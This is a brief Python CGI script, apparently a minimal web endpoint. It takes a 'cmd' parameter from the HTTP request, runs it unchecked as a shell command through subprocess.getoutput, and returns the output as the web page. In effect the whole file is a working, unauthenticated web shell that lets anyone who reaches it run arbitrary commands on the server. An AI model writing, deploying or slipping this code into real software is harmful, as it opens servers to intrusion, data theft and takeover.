#!/usr/bin/python3


print("content-type: text/html")
print()




import subprocess
import cgi
form = cgi.FieldStorage()
cmd = form.getvalue('cmd')

output = subprocess.getoutput(cmd)

print(output)
